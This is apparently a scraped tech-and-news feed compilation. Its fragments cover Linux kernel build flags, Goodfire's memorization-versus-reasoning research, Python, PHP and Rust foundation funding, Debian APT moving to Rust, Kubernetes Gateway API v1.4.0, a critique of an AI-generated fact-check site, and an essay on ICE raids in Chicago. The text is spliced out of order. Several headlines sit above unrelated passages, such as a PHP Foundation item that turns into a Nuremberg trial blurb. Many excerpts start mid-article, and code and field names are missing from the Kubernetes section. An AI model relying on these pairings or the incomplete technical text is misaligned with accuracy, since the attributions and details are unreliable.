Scale!(3-part newsletter series that breaks down popular interview questions.)Exclusive to PAID members...Here are a few of the things you’ll get:High-level architecture of real-world case studies.Deep dive into how popular real-world systems actually work.How real-world systems handle scale, reliability, and performance.10x the results you currently get with 1/10th of your time, energy, and effort.Start Date: November 2025Want to advertise in this newsletter? 📰Thank you for supporting this newsletter.You are now 180,001+ readers strong, very close to 181k.

While some dislike relying on Microsoft-style behavior, the patches in kbuild-next suggest the project is ready to "bite the bullet" and adopt the extensions system-wide. Phoronix reports: Rasmus Villemoes argued with Kbuild: enable -fms-extensions that would allow for "prettier code" and others have noted in the past the potential for saving stack space and all around being beneficial in being able to leverage the Microsoft C behavior: "Once in a while, it turns out that enabling -fms-extensions could allow some slightly prettier code. But every time it has come up, the code that had to be used instead has been deemed 'not too awful' and not worth introducing another compiler flag for. That's probably true for each individual case, but then it's somewhat of a chicken/egg situation. If we just 'bite the bullet' as Linus says and enable it once and for all, it is available whenever a use case turns up, and no individual case has to justify it..."
 
The second patch is kbuild: Add '-fms-extensions' to areas with dedicated CFLAGS to ensure -fms-extensions is passed for the CPU architectures that rely on their own CFLAGS being set rather than the main KBUILD_CFLAGS. Linus Torvalds chimed in on the prior mailing list discussion and doesn't appear to be against enabling -fms-extensions beginning with the Linux 6.19 kernel.]]></content:encoded></item><item><title>Researchers isolate memorization from problem-solving in AI neural networks</title><link>https://arstechnica.com/ai/2025/11/study-finds-ai-models-store-memories-and-logic-in-different-neural-regions/</link><author>Benj Edwards</author><category>tech</category><enclosure url="https://cdn.arstechnica.net/wp-content/uploads/2025/07/surprised_robot_2-1152x648.jpg" length="" type=""/><pubDate>Mon, 10 Nov 2025 23:06:42 +0000</pubDate><source url="https://arstechnica.com/">Biz &amp; IT – Ars Technica</source><content:encoded><![CDATA[When engineers build AI language models like GPT-5 from training data, at least two major processing features emerge: memorization (reciting exact text they’ve seen before, like famous quotes or passages from books) and what you might call “reasoning” (solving new problems using general principles). New research from AI startup Goodfire.ai provides the first potentially clear evidence that these different functions actually work through completely separate neural pathways in the model’s architecture.The researchers discovered that this separation proves remarkably clean. In a preprint paper released in late October, they described that when they removed the memorization pathways, models lost 97 percent of their ability to recite training data verbatim but kept nearly all their “logical reasoning” ability intact.For example, at layer 22 in Allen Institute for AI’s OLMo-7B language model, the researchers ranked all the weight components (the mathematical values that process information) from high to low based on a measure called “curvature” (which we’ll explain more below). When they examined these ranked components, the bottom 50 percent of weight components showed 23 percent higher activation on memorized data, while the top 10 percent showed 26 percent higher activation on general, non-memorized text.]]></content:encoded></item><item><title>New Project Brings Strong Linux Compatibility To More Classic Windows Games</title><link>https://linux.slashdot.org/story/25/11/10/2216209/new-project-brings-strong-linux-compatibility-to-more-classic-windows-games?utm_source=rss1.0mainlinkanon&amp;utm_medium=feed</link><author>BeauHD</author><category>dev</category><category>slashdot</category><pubDate>Mon, 10 Nov 2025 22:20:00 +0000</pubDate><source url="https://linux.slashdot.org/">Dev - Slashdot - Linux</source><content:encoded><![CDATA[An anonymous reader quotes a report from Ars Technica: For years now, Valve has been slowly improving the capabilities of the Proton compatibility layer that lets thousands of Windows games work seamlessly on the Linux-based SteamOS. But Valve's Windows-to-Linux compatibility layer generally only extends back to games written for Direct3D 8, the proprietary Windows graphics API Microsoft released in late 2000. Now, a new open source project is seeking to extend Linux interoperability further back into PC gaming history. The d7vk project describes itself as "a Vulkan-based translation layer for Direct3D 7 [D3D7], which allows running 3D applications on Linux using Wine."
 
The new project isn't the first attempt to get Direct3D 7 games running on Linux. Wine's own built-in WineD3D compatibility layer has supported D3D7 in some form or another for at least two decades now. But the new d7vk project instead branches off the existing dxvk compatibility layer, which is already used by Valve's Proton for SteamOS and which reportedly offers better performance than WineD3D on many games. D7vk project author WinterSnowfall writes that while they don't expect this new project to be upstreamed into the main dxvk in the future, the new version should have "the same level of per application/targeted configuration profiles and fixes that you're used to seeing in dxvk proper." And though d7vk might not perform universally better than the existing alternatives, WinterSnowfall writes that "having more options on the table is a good thing in my book at least." The report notes that the PC Gaming Wiki lists more than 400 games built on the aging D3D7 APIs, spanning mostly early-2000s releases but with a trickle of new titles still appearing through 2022. Notable classics include Escape from Monkey Island and Hitman: Codename 47.]]></content:encoded></item><item><title>The PHP Foundation Is Seeking a New Executive Director</title><link>https://developers.slashdot.org/story/25/11/10/194259/the-php-foundation-is-seeking-a-new-executive-director?utm_source=rss1.0mainlinkanon&amp;utm_medium=feed</link><author>msmash</author><category>dev</category><category>slashdot</category><pubDate>Mon, 10 Nov 2025 20:51:00 +0000</pubDate><source url="https://developers.slashdot.org/">Dev - Slashdot - Dev</source><content:encoded><![CDATA[New submitter benramsey writes: The PHP Foundation has launched a search for its next executive director.

The question for victorious allies was how to ensure that justice was seen to be done. Decision was made that was unique in history. There would be an international trial convened in the German city of Nuremberg. The senior Nazis men like Hermann Goering, would be placed in the dock. And the trial that followed would change the course of history.

Available reports instead describe ICE operations, clergy protests, and an internal denial of excessive force, but they do not corroborate the specific October pastor shooting allegation [3][4].Fact check: Who was the pastor shot with a pepper ball by ICENo credible reporting in the provided materials identifies a pastor who was shot with a pepper‑ball by ICE; multiple recent accounts instead document journalists, protesters, and community members being hit by pepper‑ball munitions at ICE facilities and demonstrations. The available sources (dated September–November 2025) describe incidents in Chicago, Los Angeles and Portland, note active investigations and protests, and show no direct evidence that a pastor was targeted or injured by ICE with a pepper ball [1][2][3][4].These certainly look authoritative. They’re written in complete English sentences, with professional diction and lots of nods to neutrality and skepticism. There are lengthy, point-by-point explanations with extensively cited sources. The second article goes so far as to suggest “who might be promoting a pastor-victim narrative”.The problem is that both articles are false. Thisstorywasbroadlyreported, as in this October 8th Fox News article unambiguously titled “Video shows federal agent shoot Chicago pastor in head with pepper ball during Broadview ICE protest”. DHS Assistant Secretary Tricia McLaughlin even went on X to post about it. This event definitely happened, and it would not have been hard to find coverage at the time these articles were published. It was, quite literally, all over the news.Or maybe the articles are sort of true. Each summary disclaims that its findings are based on “the available materials supplied for review”, or “the provided materials”. This is splitting hairs. Source selection is an essential part of the fact-checking process, and Factually selects its own sources in response to user questions. Instead of finding authoritative sources, Factually selected irrelevant ones and spun them into a narrative which is the opposite of true. Many readers will not catch this distinction. Indeed, I second-guessed myself when I saw the Factually articles—and I read the original reporting when it happened.“These conversations matter for democracy,” says the call-to-action at the top of every Factually article. The donation button urges readers to “support independent reporting.”But this is not reporting. Reporters go places and talk to people. They take photographs and videos. They search through databases, file FOIA requests, read court transcripts, evaluate sources, and integrate all this with an understanding of social and historical context. People go to journalism school to do this.What Factually does is different. It takes a question typed by a user and hands it to a Large Language Model, or LLM, to generate some query strings. It performs up to three Internet search queries, then feeds the top nine web pages it found to a pair of LLMs, and asks them to spit out some text shaped like a fact check. This text may resemble the truth, or—as in these cases—utterly misrepresent it.Calling Factually’s articles “fact checks” is a category error. A fact checker diligently investigates a claim, reasons about it, and ascertains some form of ground truth. Fact checkers are held to a higher evidentiary standard; they are what you rely on when you want to be sure of something. They are supposed to be right when other sources are wrong. The web pages on factually.co are fact-check-flavored slurry, extruded by a statistical model which does not understand what it is doing. They are fancy Mad Libs.The end result of this absurd process is high-ranking, authoritative-sounding web pages which sometimes tell the truth, and sometimes propagate lies. Factually is a stochastic disinformation machine which exacerbates the very problems fact-checkers are supposed to solve.]]></content:encoded></item><item><title>Goodnight Universe Review - The Before Your Eyes Team Does It Again</title><link>https://www.gamespot.com/reviews/goodnight-universe-review/1900-6418438/?ftag=CAD-01-10abi2f</link><author>Mark Delaney</author><category>tech</category><enclosure url="https://www.gamespot.com/a/uploads/screen_medium/1632/16320660/4599244-gnu1.jpg" length="" type=""/><pubDate>Mon, 10 Nov 2025 17:00:00 +0000</pubDate><source url="https://www.gamespot.com/feeds/reviews/">GameSpot - Game Reviews</source><content:encoded><![CDATA[My third child is due in January. When my wife and I sent our first child to kindergarten, we were among the youngest parents in our school community. But when this next baby is grown up and ready for school, I'll be over 40. I sometimes think about how our kids get more or less time with us on this planet based on when we had them. I'll be in this child's life for less time than I was in their siblings' lives, necessarily. It's simple, unconquerable math, and it bums me out. I promise myself I'll stay healthy and attentive to the best of my ability so that I can wring every last day out of my life with them. But even in the best-case scenario, there's no catching up in years. How do I make those days count when they feel so numbered? How can I make up for lost time? Goodnight Universe, the next game from a team comprised mainly of those who made Before Your Eyes, explores this space magnificently and, as should be expected if you played the team's last game, to heartwrenching effect.In Goodnight Universe, you take on the novel role of a baby named Issac. Played in first-person and using optional camera tracking (on PC, but not consoles) like Before Your Eyes, you'll live out Issac's unexpectedly adventurous life. Early on, you'll meet his parents and sister, as well as his grandfather and other significant figures who enter his life. As an adult, Issac narrates his memories from infancy, and you'll live them out yourself, smashing the tray attached to your highchair, playing with your teething toys, and finding yourself utterly mesmerized by the children's TV show, Gilbert the Goat.While these sound like typical things a baby would do, it doesn't take long for Issac to admit he was different--special, even. According to Issac, from birth, he could think fluently and problem-solve like an adult. He could even go beyond those behaviors. As a telekinetic, he's able to move things with his mind or read people's thoughts. In gameplay terms, you'll perform these supernatural feats using a controller if you prefer, but more engaging is to use camera tracking and perform them with your own face and hands.Continue Reading at GameSpot]]></content:encoded></item><item><title>What Volcanoes Tell Us About NUCLEAR WAR</title><link>https://www.youtube.com/shorts/9ma_Zd3igTQ</link><author>Imperial War Museums</author><category>yt</category><enclosure url="https://www.youtube.com/v/9ma_Zd3igTQ?version=3" length="" type=""/><pubDate>Mon, 10 Nov 2025 16:13:34 +0000</pubDate><source url="https://www.youtube.com/channel/UC3uAjWoLZ4bSi6qI9SjALxA">Imperial War Museums</source><content:encoded><![CDATA[This video examines the potential consequences of a full-scale nuclear war.

ABSTRACT
Containers solved a huge deployment headache—but they didn’t magically erase legacy thinking. If your “modernization” effort stopped at lifting-and-shifting monolithic apps into Kubernetes, you’ve simply boxed yesterday’s problems in today’s tech.

In this session we’ll unpack why true modernization demands more than orchestration stickers: it requires re-architecting for event-driven, serverless, and AI-augmented patterns that slash time-to-value and operating costs. Drawing on field experience across 50+ enterprise and startup transformations—spanning 8,000+ AWS Lambda functions, real-time data pipelines, and GenAI copilots.

We’ll explore:
• The Illusion of Progress: Hidden technical debt and cost traps that containers often preserve.
• Transformation Levers: Domain-driven decomposition, serverless services, and managed data layers that free teams from infrastructure toil.
• GenAI as a Catalyst: Where large-language-model capabilities amplify modernization ROI—and where they don’t.
• Change Management Playbook: Culture, skill-matrix, and governance shifts that let teams iterate safely at cloud speed.
• Success Metrics & Case Studies: Concrete KPIs (release frequency ↑ 5×, infra spend ↓ 60%) from healthcare, QSR, and fintech modernizations. [...]

So this week they announced a new initiative "to provide consistent, transparent, and long term support for the developers who make the Rust programming language possible." 




It's the Rust Foundation Maintainers Fund, "an initiative we'll shape in close collaboration with the Rust Project Leadership Council and Project Directors to ensure funding decisions are made openly and with accountability."



 In the months ahead, we'll define the fund's structure, secure contributions, and work with the Rust Project and community to bring it to life. This work will build on lessons from earlier iterations of our grants and fellowships to create a lasting framework for supporting Rust's maintainers... Over the past several months, through ongoing board discussions and input from the Leadership Council, this initiative has taken shape as a way to help maintainers continue their vital development and review work, and plan for the future... 


This initiative reflects our commitment to Rust being shaped by its people, guided by open collaboration, and backed by a global network of contributors and partners. The Rust Foundation Maintainers Fund will operate within the governance framework shared between the Rust Project and the Rust Foundation, ensuring alignment and oversight at every level... The Rust Foundation's approach to this initiative will be guided by our structure: as a 501( C)(6) nonprofit, we operate under a mandate for transparency and accountability to the Rust Project, language community, and our members. That means we must develop this fund in coordination with the Rust Project's priorities, ensuring shared governance and long-term viability... 

Our goal is simple: to help the people building Rust continue their essential work with the support they deserve. That means creating the conditions for long term maintainer roles and ensuring continuity for those whose efforts keep the language stable and evolving. Through the Rust Foundation Maintainers Fund, we aim to address these needs directly.
 

"The more companies using Rust can contribute to the Rust Foundation Maintainers Fund, the more we can keep the language and tooling evolving for the benefit of everyone," says Rust Foundation project director Carol Nichols.]]></content:encoded></item><item><title>The Battle of Passchendaele</title><link>https://shows.acast.com/dansnowshistoryhit/episodes/the-battle-of-passchendaele</link><author></author><category>podcast</category><enclosure url="https://sphinx.acast.com/p/acast/s/dansnowshistoryhit/e/69034f1b1e6d5f214e80a63f/media.mp3?tk=eyJ0ayI6ImRlZmF1bHQiLCJhZHMiOnRydWUsInNwb25zIjp0cnVlLCJzdGF0dXMiOiJwdWJsaWMifQ==&amp;sig=Eq06UJCUs2zO-k_B3phPCQnzm7dzOQ37YE_v0XMMr54" length="" type=""/><pubDate>Mon, 10 Nov 2025 00:30:00 +0000</pubDate><source url="https://www.historyhit.com/podcasts/">Podcast - HistoryHit</source><content:encoded><![CDATA[In partnership with Findmypast, Dan narrates the extraordinary story of the Western Front at its most unforgiving.

By Friday they'd raised over $157,000, including 295 new Supporting Members paying an annual $99 membership fee, says PSF executive director Deb Nicholson. 

 "It doesn't quite bridge the gap of $1.5 million, but it's incredibly impactful for us, both financially and in terms of feeling this strong groundswell of support from the community."


Could that same security project still happen if new funding materializes? The PSF hasn't entirely given up. "The PSF is always looking for new opportunities to fund work benefiting the Python community," Nicholson told me in an email last week, adding pointedly that "we have received some helpful suggestions in response to our announcement that we will be pursuing." And even as things stand, the PSF sees itself as "always developing or implementing the latest technologies for protecting PyPI project maintainers and users from current threats," and it plans to continue with that commitment.
 


The Python Software Foundation was "astounded and deeply appreciative at the outpouring of solidarity in both words and actions," their executive director wrote in a new blog post this week, saying the show of support "reminds us of the community's strength." 

But that post also acknowledges the reality that the Python Software Foundation's yearly revenue and assets (including contributions from major donors) "have declined, and costs have increased,..."


Historically, PyCon US has been a source of revenue for the PSF, enabling us to fund programs like our currently paused Grants Program... Unfortunately, PyCon US has run at a loss for three years — and not from a lack of effort from our staff and volunteers! Everyone has been working very hard to find areas where we can trim costs, but even with those efforts, inflation continues to surge, and changing U.S. and economic conditions have reduced our attendance...
Because we have so few expense categories (the vast majority of our spending goes to running PyCon US, the Grants Program, and our small 13-member staff), we have limited "levers to pull" when it comes to budgeting and long-term sustainability... 

While Python usage continues to surge, "corporate investment back into the language and the community has declined overall. The PSF has longstanding sponsors and partners that we are ever grateful for, but signing on new corporate sponsors has slowed." (They're asking employees at Python-using companies to encourage sponsorships.)



We have been seeking out alternate revenue channels to diversify our income, with some success and some challenges. PyPI Organizations offers paid features to companies (PyPI features are always free to community groups) and has begun bringing in monthly income. We've also been seeking out grant opportunities where we find good fits with our mission.... We currently have more than six months of runway (as opposed to our preferred 12 months+ of runway), so the PSF is not at immediate risk of having to make more dramatic changes, but we are on track to face difficult decisions if the situation doesn't shift in the next year. 


Based on all of this, the PSF has been making changes and working on multiple fronts to combat losses and work to ensure financial sustainability, in order to continue protecting and serving the community in the long term. Some of these changes and efforts include: 

 — Pursuing new sponsors, specifically in the AI industry and the security sector
 — Increasing sponsorship package pricing to match inflation
 — Making adjustments to reduce PyCon US expenses
 — Pursuing funding opportunities in the US and Europe
 — Working with other organizations to raise awareness
 — Strategic planning, to ensure we are maximizing our impact for the community while cultivating mission-aligned revenue channels 

The PSF's end-of-year fundraiser effort is usually run by staff based on their capacity, but this year we have assembled a fundraising team that includes Board members to put some more "oomph" behind the campaign. We'll be doing our regular fundraising activities; we'll also be creating a unique webpage, piloting temporary and VERY visible pop-ups to python.org and PyPI.org, and telling more stories from our Grants Program recipients... 

Keep your eyes on the PSF Blog, the PSF category on Discuss, and our social media accounts for updates and information as we kick off the fundraiser this month. Your boosts of our posts and your personal shares of "why I support the PSF" stories will make all the difference in our end-of-year fundraiser. If this post has you all fired up to personally support the future of Python and the PSF right now, we always welcome new PSF Supporting Members and donations.

The integration targets critical areas like parsing .deb, .ar, and tar files plus HTTP signature verification using Sequoia. [APT maintainer Julian Andres Klode] said these components "would strongly benefit from memory safe languages and a stronger approach to unit testing." 

He also gave a firm message to maintainers of Debian ports: "If you maintain a port without a working Rust toolchain, please ensure it has one within the next 6 months, or sunset the port." 


The reasoning is straightforward. Debian wants to move forward with modern tools rather than being held back by legacy architecture... Debian ports running on CPU architectures without Rust compiler support have six months to add proper toolchains. If they can't meet this deadline, those ports will need to be discontinued. As a result, some obscure or legacy platforms may lose official support. For most users on mainstream architectures like x86_64 and ARM, nothing changes. Your APT will simply become more secure and reliable under the hood. 

It's FOSS argues that "If done right, this could significantly strengthen APT's security and code quality." 

And the blog Linuxiac also supports the move. "By embedding Rust into APT, the distro joins a growing number of major open-source projects, such as the Linux kernel, Firefox, and systemd, that are gradually adopting Rust. And if I had to guess, I'd say this is just one of the first steps toward even deeper Rust integration in this legendary distribution, which is a good thing."]]></content:encoded></item><item><title>Timeline Movies: 1987 -Everything That Happened In The Movies In 1987</title><link>https://www.youtube.com/watch?v=l4mECPz6adU</link><author>Weird History</author><category>yt</category><enclosure url="https://www.youtube.com/v/l4mECPz6adU?version=3" length="" type=""/><pubDate>Sun, 9 Nov 2025 15:01:18 +0000</pubDate><source url="https://www.youtube.com/channel/UCc-N24Y5OA0gqbjBwe1ttfA">Weird History</source><content:encoded><![CDATA[This installment takes us to the Movies of 1987 - as a banner decade for film continued, the year 1987 brought us George Clooney's first film appearance (and Brad Pitt's too!),  as well as the beginning of the 'Lethal Weapon' franchise, Evil Dead II, and the Cohen brother's film 'Raising Arizona'.

It is a neighborhood group: four people were
kidnapped at the corner drugstore. A friend a mile away sends a Slack message:
she was at the scene when masked men assaulted and abducted two people on the
street. A plumber working on my pipes is distraught, and I find out that two of his
employees were kidnapped that morning. A week later it happens again.An email arrives. Agents with guns have chased a teacher into the school where she
works. They did not have a warrant. They dragged her away, ignoring her and her colleagues’ pleas to show proof of her documentation. That evening I stand a few feet from the parents of Rayito de Sol and listen to them describe, with anguish, how good
Ms. Diana was to their children. What it is like to have strangers with guns
traumatize your
kids.
For a teacher to hide a three-year-old child for fear they might be
killed.
How their relatives will no longer leave the house. I hear the pain and fury in
their voices, and I wonder who will be next.Understand what it is to sleep in Chicago. On the night of September
30th,
federal agents rappelled from a Black Hawk helicopter to execute a raid on an apartment
building on the South Shore. Roughly three hundred agents deployed flashbangs,
busted down doors, and took people indiscriminately. US citizens—some women and children—were grabbed from their beds, marched outside without even a chance to dress, zip-tied, and loaded into
vans. Residents returned to find
their windows and doors broken and their belongings
stolen. Despite the violence of the raid, it appears no criminal charges were filed.Understand what it is to lead Chicago. On October 3rd, Alderperson Jesse Fuentes asked federal agents to produce a judicial warrant and allow an injured man at the hospital access to an attorney. The plainclothes agents grabbed Fuentes, handcuffed her, and took her outside the building. Her lawsuit is ongoing. On October 21st, Representative Hoan Huynh was going door-to-door to inform businesses of their immigration rights when he was attacked by six armed CBP agents, who boxed in his vehicle and pointed a gun at his face. Huynh says the agents tried to bash open his car window.Understand what it is to live in Chicago. On October 9th, Judge Ellis issued a temporary restraining
order
requiring that federal agents refrain from deploying tear gas or shooting
civilians without an imminent threat, and requiring two audible warnings. ICE
and CBP have flouted these court orders. On October 12th, federal agents
shoved an attorney to the
ground
who tried to help a man being detained in Albany Park. Agents refused to
identify themselves or produce a warrant, then deployed tear gas without
warning. On October 14th, agents rammed a car on the East Side, then
tear-gassed neighbors and
police.On October 23rd, federal agents detained seven
people,
including two U.S. citizens and an asylum seeker, in Little Village. Two worked
for Alderperson Michael Rodriguez: his chief of staff Elianne Bahena, and
police district council member Jacqueline Lopez. Again in Little Village, agents tear-gassed and pepper-sprayed protestors, seizing two high school students and a security guard, among others. Alderperson Byron Sigcho-Lopez reported that agents assaulted one of the students, who had blood on his face. On October 24th, agents in
Lakeview emerged from unmarked cars, climbed a locked fence to enter a
private yard, and kidnapped a construction
worker.
As neighbors gathered, they deployed four tear gas canisters. That same day, a few blocks away,
men with rifles jumped out of SUVs and assaulted a man standing at a bus
stop.“They were beating him,” said neighbor Hannah Safter. “His face was bleeding”.They returned minutes later and attacked again. A man from the Laugh Factory, a
local comedy club, had come outside with his mother and sister. “His mom put
her body in between them, and one of the agents kicked her in the face”.“Kids dressed in Halloween costumes walking to a parade do not pose an immediate threat to the safety of a law enforcement officer. They just don’t. And you can’t use riot control weapons against them,” Judge Ellis said to Border Patrol chief Gregory Bovino.Understand how the government speaks about Chicago. On November 3rd, paralegal Dayanne Figueroa, a US citizen, was driving to work when federal agents crashed into her car, drew their guns, and dragged her from the vehicle. Her car was left behind, coffee still in the cup holder, keys still in the car. The Department of Homeland Security blamed her, claiming she “violently resisted arrest, injuring two officers.” You can watch the video for yourself.“I find the government’s evidence to be simply not credible,” said Judge Ellis in her November 6th ruling. “The use of force shocks the conscience.” The court’s November 20th opinion provides exhaustive evidence. “The BWC video shows that the protesters were simply standing there when agents first deployed any force,” Ellis writes. “DHS tried to claim protestors threw fireworks at agents… when the helicopter and BWC footage indicates that those explosions were instead agents’ flashbang grenades.” These stories go on and on. “It becomes difficult, if not impossible, to believe almost anything that Defendents represent.”Understand what it is to be Chicago. To carry a whistle and have the ICIRR hotline in your phone. To wake up from nightmares of shouting militiamen and guns in your face. To rehearse every day how to calmly refuse entry, how to identify a judicial warrant, how to film and narrate an assault. To wake to helicopters buzzing your home, to feel your heart rate spike at the car horns your neighbors use to alert each other to ICE and CBP enforcement. To know that perhaps three thousand of your fellow Chicagoans have been disappeared by the government, but no one really knows for sure. To know that many of those seized were imprisoned a few miles away, as many as a hundred and fifty people in a cell, denied access to food, water, sanitation, and legal representation. To know that many of these agents—masked, without badge numbers or body cams, and refusing to identify themselves—will never face justice. To wonder what they tell their children.The masked thugs who attack my neighbors, who point guns at elected officials and shoot pastors with pepper balls, who tear-gas neighborhoods, terrify children, and drag teachers and alderpeople away in handcuffs are not unprecedented. We knew this was coming a year ago, when Trump promised mass deportations. We knew it was coming, and seventy-seven million of us voted for it anyway.This weight presses on me every day. I am flooded with stories. There are so many I cannot remember them all; cannot keep straight who was gassed, beaten, abducted, or shot. I write to leave a record, to stare at the track of the tornado. I write to leave a warning. I write to call for help.I want you to understand, regardless of your politics, the historical danger of a secret police. What happens when a militia is deployed in our neighborhoods and against our own people. Left unchecked their mandate will grow; the boundaries of acceptable identity and speech will shrink. I want you to think about elections in this future. I want you to understand that every issue you care about—any hope of participatory democracy—is downstream of this.I want you to understand Chicago.This essay has been building—eating at me, really—for the last two months. My thanks to all the friends, family, neighbors and colleagues who have talked with me about ICE and CBP. In particular, I want to acknowledge the families of Rayito de Sol—parents like Maria Guzman and Tara Goodarzi, whose powerful speeches have been lodged in my chest. Also the members of One Northside, Aldermen Vasquez and Martin, Senator Simmons, and everyone who spoke at the rally Wednesday. Your call to “tell the story” caught me, and I hope I have done some small part of that work here.ICE and CBP affect us all: south, east, north and west; city and suburb. In particular, ICE has hit Little Village, a predominantly Latino neighborhood on the Southwest Side, hard in recent weeks. Marginalized communities especially deserve our focus and care.You can donate your time and money to organizations like ICIRR, which connects immigrants and refugees with legal aid and social services. I also suggest a donation to the non-profit Block Club Chicago or Chicago Sun-Times, both of whom have been doing exceptional local journalism in this dark time. Without their reporting, this would have been impossible.]]></content:encoded></item><item><title>Joe Rogan Experience #2408 - Bret Weinstein</title><link>https://www.youtube.com/watch?v=gXbsq5nVmT0</link><author>PowerfulJRE</author><category>podcast</category><enclosure url="https://www.youtube.com/v/gXbsq5nVmT0?version=3" length="" type=""/><pubDate>Sat, 8 Nov 2025 18:00:48 +0000</pubDate><source url="https://www.youtube.com/channel/UCzQUP1qoWDoEbmsQxvdjxgQ">Podcast - Joe Rogan</source><content:encoded><![CDATA[Bret Weinstein, PhD, is an evolutionary biologist, author, and co-host of “The DarkHorse Podcast” with his wife, biologist Heather Heying.

Bush administration over the power of the presidency and the rule of law. 

This journalism is made possible by viewers like you. Support your local PBS station here: https://www.pbs.org/donate

For three decades, Dick Cheney had been an advocate of granting the president virtually unlimited wartime power. In the aftermath of the attacks on Sept. 11, 2001, with Cheney as George W. Bush’s vice president, the Justice Department and the White House made a number of controversial legal decisions. Orchestrated by Cheney and his lawyer David Addington, the department interpreted executive power in an expansive and extraordinary way, granting Bush the power to detain, interrogate, torture, wiretap and spy — without congressional approval or judicial review.

In “Cheney’s Law,” a documentary by Michael Kirk and his team, FRONTLINE examined the battle over the power of the presidency and Cheney’s way of looking at the Constitution. As the White House and Congress faced off over executive privilege, the terrorist surveillance program, and the firing of U.S. attorneys, FRONTLINE told the story of what formed Cheney’s perspectives and what some at the time viewed as the most ambitious project to reshape the power of the president in American history.

The Kubernetes SIG Network community presented the General Availability (GA) release of Gateway API (v1.4.0)! Released on October 6, 2025, version 1.4.0 reinforces the path for modern, expressive, and extensible service networking in Kubernetes.Gateway API v1.4.0 brings three new features to the 
(Gateway API's GA release channel):BackendTLSPolicy for TLS between gateways and backends in GatewayClass statusand introduces three new experimental features:Mesh resource for service mesh configuration to ease configuration burden** filter for HTTPRouteGraduations to Standard ChannelBackendTLSPolicy is a new Gateway API type for specifying the TLS configuration
of the connection from the Gateway to backend pod(s).
. Prior to the introduction of BackendTLSPolicy, there was no API specification
that allowed encrypted traffic on the hop from Gateway to backend.The  configuration requires a hostname. This 
serves two purposes. It is used as the SNI header when connecting to the backend and
for authentication, the certificate presented by the backend must match this hostname,
 is explicitly specified.If  (SANs) are specified, the  is only used for SNI, and authentication is performed against the SANs instead. If you still need to authenticate against the hostname value in this case, you MUST add it to the  list.BackendTLSPolicy  configuration also requires either  or .
 refer to one or more (up to 8) PEM-encoded TLS certificate bundles. If there are no specific certificates to use,
then depending on your implementation, you may use ,
set to "System" to tell the Gateway to use an implementation-specific set of trusted CA Certificates.In this example, the BackendTLSPolicy is configured to use certificates defined in the auth-cert ConfigMap
to connect with a TLS-encrypted upstream connection where pods backing the auth service are expected to serve a
valid certificate for . It uses  with a Hostname type, but you may also use a URI type.In this example, the BackendTLSPolicy is configured to use system certificates to connect with a TLS-encrypted backend connection where Pods backing the dev Service are expected to serve a valid certificate for .GatewayClass status has a new field, .
This addition allows implementations to declare the set of features they support. This provides a clear way for users and tools to understand the capabilities of a given GatewayClass.This feature's name for conformance tests (and GatewayClass status reporting) is .
Implementations must populate the  field in the  of the GatewayClass  the GatewayClass
is accepted, or in the same operation.Here’s an example of a  published under GatewayClass' :Graduation of SupportedFeatures to Standard, helped improve the conformance testing process for Gateway API.
The conformance test suite will now automatically run tests based on the features populated in the GatewayClass' status.
This creates a strong, verifiable link between an implementation's declared capabilities and the test results,
making it easier for implementers to run the correct conformance tests and for users to trust the conformance reports.This means when the SupportedFeatures field is populated in the GatewayClass status there will be no need for additional
conformance tests flags like , or  or .
It's important to note that Mesh features are an exception to this and can be tested for conformance by using
, or by manually providing any combination of features related flags until the dedicated resource
graduates from the experimental channel.This enhancement enables route rules to be explicitly identified and referenced across the Gateway API ecosystem.
Some of the key use cases include: Allowing status conditions to reference specific rules directly by name. Making it easier to identify individual rules in logs, traces, and metrics. Enabling policies (GEP-713) to target specific route rules via the  field in their . Simplifying filtering and referencing of route rules in tools such as , , and general-purpose utilities like  and .Internal configuration mapping: Facilitating the generation of internal configurations that reference route rules by name within gateway and mesh implementations.This follows the same well-established pattern already adopted for Gateway listeners, Service ports, Pods (and containers),
and many other Kubernetes resources.While the new name field is  (so existing resources remain valid), its use is .
Implementations are not expected to assign a default value, but they may enforce constraints such as immutability.Finally, keep in mind that the name format is validated,
and other fields (such as )
may impose additional, indirect constraints.Experimental channel changesEnabling external Auth for HTTPRouteGiving Gateway API the ability to enforce authentication and maybe authorization as well at the Gateway or HTTPRoute level has been a highly requested feature for a long time. (See the GEP-1494 issue for some background.)This Gateway API release adds an Experimental filter in HTTPRoute that tells the Gateway API implementation to call out to an external service to authenticate (and, optionally, authorize) requests.This filter is based on the Envoy ext_authz API, and allows talking to an Auth service that uses either gRPC or HTTP for its protocol.Both methods allow the configuration of what headers to forward to the Auth service, with the HTTP protocol allowing some extra information like a prefix path.A HTTP example might look like this (noting that this example requires the Experimental channel to be installed and an implementation that supports External Auth to actually understand the config):This allows the backend Auth service to use the supplied headers to make a determination about the authentication for the request.When a request is allowed, the external Auth service will respond with a 200 HTTP response code, and optionally extra headers to be included in the request that is forwarded to the backend. When the request is denied, the Auth service will respond with a 403 HTTP response.Since the Authorization header is used in many authentication methods, this method can be used to do Basic, Oauth, JWT, and other common authentication and authorization methods.Gateway API v1.4.0 introduces a new experimental Mesh resource, which provides a way to configure mesh-wide settings and discover the features supported by a given mesh implementation. This resource is analogous to the Gateway resource and will initially be mainly used for conformance testing, with plans to extend its use to off-cluster Gateways in the future.The Mesh resource is cluster-scoped and, as an experimental feature, is named  and resides in the gateway.networking.x-k8s.io API group. A key field is controllerName, which specifies the mesh implementation responsible for the resource. The resource's  stanza indicates whether the mesh implementation has accepted it and lists the features the mesh supports.One of the goals of this GEP is to avoid making it more difficult for users to adopt a mesh. To simplify adoption, mesh implementations are expected to create a default Mesh resource upon startup if one with a matching  doesn't already exist. This avoids the need for manual creation of the resource to begin using a mesh.The new XMesh API kind, within the gateway.networking.x-k8s.io/v1alpha1 API group,
provides a central point for mesh configuration and feature discovery (source).A minimal XMesh object specifies the :The mesh implementation populates the status field to confirm it has accepted the resource and to list its supported features ( source):Introducing default GatewaysFor application developers, one common piece of feedback has been the need to explicitly name a parent Gateway for every single north-south Route. While this explicitness prevents ambiguity, it adds friction, especially for developers who just want to expose their application to the outside world without worrying about the underlying infrastructure's naming scheme. To address this, we have introduce the concept of .For application developers: Just "use the default"As an application developer, you often don't care about the specific Gateway your traffic flows through, you just want it to work. With this enhancement, you can now create a Route and simply ask it to use a default Gateway.This is done by setting the new  field in your Route's .Here’s a simple  that uses a default Gateway:That's it! No more need to hunt down the correct Gateway name for your environment. Your Route is now a "defaulted Route."For cluster operators: You're still in controlThis feature doesn't take control away from cluster operators ("Chihiro").
